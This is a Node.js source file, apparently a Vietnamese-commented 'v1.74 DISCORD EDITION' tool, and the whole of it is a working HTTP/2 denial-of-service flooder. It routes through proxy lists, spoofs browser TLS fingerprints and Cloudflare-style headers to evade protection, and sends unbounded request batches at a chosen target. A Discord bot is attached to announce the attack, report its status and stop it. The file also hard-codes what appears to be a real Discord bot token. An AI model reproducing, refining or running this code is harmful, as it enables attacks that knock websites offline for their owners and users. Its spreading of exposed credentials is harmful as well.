// ==++==
// v1.74-DISCORD.js - GIỮ NGUYÊN CODE GỐC + DISCORD
// Chạy: node v1.74-DISCORD.js
// ==++==

process.on('uncaughtException', function(er) {});
process.on('unhandledRejection', function(er) {});
process.on("SIGHUP", () => 1);
process.on("SIGCHILD", () => 1);

require("events").EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

// ==================== THÊM DISCORD ====================
const { Client, GatewayIntentBits } = require('discord.js');
const discordClient = new Client({ 
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ] 
});

// CONFIG DISCORD - THAY CÁI NÀY
const TOKEN = 'MTQ1Njk2NDc5NDIxMjE1OTcwMg.Gbjcnz.OTQf4MPxvnLklLbUPfeaDSvTCeJMuBxh70tfZM';
const CHANNEL_ID = '1456595444477198508';
// ====================================================

const cluster = require("cluster");
const crypto = require("crypto");
const http2 = require("http2");
const net = require("net");
const tls = require("tls");
const url = require("url");
const fs = require("fs");
const path = require("path");

var fileName = __filename;
var colors = require("colors");
var file = path.basename(fileName);

// ==================== CODE GỐC v1.74 HOÀN TOÀN GIỮ NGUYÊN ====================
if (process.argv.length < 7) {
    console.log('node v1.74.js <url> <time> <requests> <threads> <proxy>'.rainbow);
    process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";

const secureContext = tls.createSecureContext({
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
});

const headers = {};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() && line.includes(':'));
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomCharacters(length) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let output = "";
    for (let count = 0; count < length; count++) {
        output += chars[Math.floor(Math.random() * chars.length)];
    }
    return output;
}

const args = {
    target: process.argv[2],
    time: process.argv[3],
    rate: process.argv[4],
    threads: process.argv[5],
    proxy: process.argv[6],
    cookie: process.argv[7] || undefined
};

// ==================== HEADER LISTS ====================
const accept_header = [
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
];

const cache_header = [
    'no-cache',
    'no-store',
    'no-transform',
    'only-if-cached',
    'max-age=0',
    'must-revalidate',
    'public',
    'private',
    'proxy-revalidate'
];

const lang_header = [
    'en-US,en;q=0.9',
    'vi-VN,vi;q=0.9,en-US;q=0.8',
    'fr-FR,fr;q=0.9,en;q=0.8',
    'ja-JP,ja;q=0.9,en;q=0.8',
    'zh-CN,zh;q=0.9,en;q=0.8'
];

const platform = [
    "Windows",
    "Macintosh",
    "Linux",
    "iOS",
    "Android",
    "iPhone",
    "iPad"
];

const dest_header = [
    'document',
    'empty',
    'iframe',
    'image',
    'script'
];

const mode_header = [
    'navigate',
    'cors',
    'no-cors',
    'same-origin'
];

const site_header = [
    'cross-site',
    'same-origin',
    'same-site',
    'none'
];

const encoding_header = [
    'gzip, deflate, br',
    'gzip, deflate',
    'br, gzip, deflate'
];

const uap = [
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 20_0 like Mac OS X) AppleWebKit/605.1.15 Version/20.0 Mobile/15E148 Safari/604.1'
];

var proxies = readLines(args.proxy);
const parsedTarget = url.parse(args.target);

// ==================== CLASS NetSocket ====================
class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 20000);
        connection.setKeepAlive(true, 20000);
        connection.setNoDelay(true);
        
        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "403");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "403");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "403");
        });
    }
}

// ==================== CLUSTER ====================
if (cluster.isMaster) {
    console.clear();
    console.log("⚡ v1.74 DISCORD EDITION".rainbow);
    console.log(`Target: ${args.target}`.green);
    console.log(`Time: ${args.time}s`.green);
    console.log(`Rate: ${args.rate}`.green);
    console.log(`Threads: ${args.threads}`.green);
    console.log(`Proxy: ${args.proxy} (${proxies.length} proxies)`.green);
    console.log("ATTACK STARTED".bgRed);
    
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    
    let stats = { total: 0 };
    const startTime = Date.now();

    cluster.on('message', (worker, msg) => {
        if (msg && msg.type === 'stats') {
            stats.total += msg.count || 0;
        }
    });

    // Stats hiển thị trên console
    setInterval(() => {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const rps = Math.floor(stats.total / (elapsed || 1));
        
        console.clear();
        console.log("⚡ v1.74 DISCORD EDITION".rainbow);
        console.log(`Time: ${elapsed}s / ${args.time}s`.yellow);
        console.log(`Requests: ${stats.total.toLocaleString()}`.cyan);
        console.log(`RPS: ${rps}`.magenta);
        console.log(`Workers: ${Object.keys(cluster.workers).length}`.green);
        console.log("ATTACKING".bgRed);
        
        stats.total = 0;
    }, 1000);
    
    // ==================== DISCORD BOT ====================
    let attackActive = true;
    
    discordClient.once('ready', () => {
        console.log(`\x1b[32m[+] Discord Bot ${discordClient.user.tag} ready!\x1b[0m`);
        const channel = discordClient.channels.cache.get(CHANNEL_ID);
        if (channel) {
            channel.send(`
⚔️ **v1.74 DISCORD EDITION** ⚔️
Target: ${args.target}
Time: ${args.time}s
Rate: ${args.rate}
Threads: ${args.threads}
Proxy: ${proxies.length}
Status: 🔥 ATTACKING
            `);
        }
    });

    discordClient.on('messageCreate', (message) => {
        if (message.channel.id !== CHANNEL_ID) return;
        
        if (message.content === '!stop') {
            attackActive = false;
            process.exit(0);
        }
        
        if (message.content === '!status') {
            const elapsed = Math.floor((Date.now() - startTime) / 1000);
            const rps = Math.floor(stats.total / (elapsed || 1));
            message.channel.send(`
📊 **STATUS**
Time: ${elapsed}s / ${args.time}s
Requests: ${stats.total.toLocaleString()}
RPS: ${rps}
Workers: ${Object.keys(cluster.workers).length}
Proxy: ${proxies.length}
            `);
        }
    });

    discordClient.login(TOKEN).catch(err => {
        console.log(`\x1b[31m[!] Discord login failed: ${err.message}\x1b[0m`);
    });

    setTimeout(() => {
        attackActive = false;
        console.log("\nAttack finished".green);
        const channel = discordClient.channels.cache.get(CHANNEL_ID);
        if (channel) {
            channel.send(`✅ **ATTACK FINISHED** - Total requests: ${stats.total.toLocaleString()}`);
        }
        process.exit(0);
    }, args.time * 1000);
    
} else {
    // Worker
    let count = 0;
    setInterval(() => {
        process.send({ type: 'stats', count });
        count = 0;
    }, 1000);

    function runFlooder() {
        const proxyAddr = randomElement(proxies);
        if (!proxyAddr) {
            setTimeout(runFlooder, 1000);
            return;
        }
        
        const parsedProxy = proxyAddr.split(":");
        
        const uas = randomElement(uap);
        const headers = {
            ":method": "GET",
            ":path": parsedTarget.path + '?' + randomCharacters(8),
            ":authority": parsedTarget.host,
            "accept": randomElement(accept_header),
            "accept-encoding": randomElement(encoding_header),
            "accept-language": randomElement(lang_header),
            "cache-control": randomElement(cache_header),
            "pragma": "no-cache",
            "cookie": args.cookie || `cf_clearance=${randomCharacters(40)}; _ga=${randomCharacters(20)}`,
            "sec-ch-ua": `"Chromium";v="150", "Google Chrome";v="150", "Not?A_Brand";v="99"`,
            "cf-cache-status": "DYNAMIC",
            "referer": "https://www.google.com/",
            "priority": "u=0, 1",
            "origin": parsedTarget.host,
            "cdn-loop": "cloudflare",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": randomElement(platform),
            "sec-fetch-dest": randomElement(dest_header),
            "sec-fetch-mode": randomElement(mode_header),
            "sec-fetch-site": randomElement(site_header),
            "sec-fetch-user": "1",
            "upgrade-insecure-requests": "1",
            "user-agent": uas,
            "x-requested-with": "XMLHttpRequest",
            "x-forwarded-for": parsedProxy[0],
            "x-forwarded-proto": "https"
        };

        const Socker = new NetSocket();
        const proxyOptions = {
            host: parsedProxy[0],
            port: parseInt(parsedProxy[1]),
            address: parsedTarget.host + ":443",
            timeout: 100
        };

        Socker.HTTP(proxyOptions, (connection, error) => {
            if (error || !connection) return;

            connection.setKeepAlive(true, 90000);
            connection.setNoDelay(true);

            const tlsOptions = {
                port: 443,
                ALPNProtocols: ["h2", "http/1.1"],
                secure: true,
                ciphers: ciphers,
                sigalgs: sigalgs,
                requestCert: true,
                socket: connection,
                ecdhCurve: ecdhCurve,
                honorCipherOrder: false,
                rejectUnauthorized: false,
                host: parsedTarget.host,
                servername: parsedTarget.host,
                secureOptions: secureOptions,
                secureContext: secureContext,
                secureProtocol: secureProtocol
            };

            try {
                const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

                tlsConn.allowHalfOpen = true;
                tlsConn.setNoDelay(true);
                tlsConn.setKeepAlive(true, 60 * 100000);
                tlsConn.setMaxListeners(0);

                const client = http2.connect(parsedTarget.href, {
                    protocol: "https:",
                    settings: {
                        headerTableSize: 65536,
                        maxConcurrentStreams: 1000,
                        initialWindowSize: 6291456,
                        maxHeaderListSize: 262144,
                        enablePush: false
                    },
                    maxSessionMemory: 3333,
                    maxDeflateDynamicTableSize: 4294967295,
                    createConnection: () => tlsConn
                });

                client.settings({
                    headerTableSize: 65536,
                    maxConcurrentStreams: 1000,
                    initialWindowSize: 6291456,
                    maxHeaderListSize: 262144,
                    enablePush: false
                });

                client.setMaxListeners(0);

                client.on("connect", () => {
                    function sendBatch() {
                        for (let i = 0; i < args.rate; i++) {
                            try {
                                const request = client.request(headers);
                                request.on("response", () => {
                                    request.close();
                                    request.destroy();
                                });
                                request.on("error", () => {});
                                request.end();
                                count++;
                            } catch (e) {}
                        }
                        setImmediate(sendBatch);
                    }
                    sendBatch();
                });

                client.on("close", () => {
                    client.destroy();
                    connection.destroy();
                });

                client.on("error", () => {
                    client.destroy();
                    connection.destroy();
                });

            } catch (e) {
                connection.destroy();
            }
        });
    }

    for (let i = 0; i < 5; i++) {
        setTimeout(runFlooder, i * 100);
    }
    }
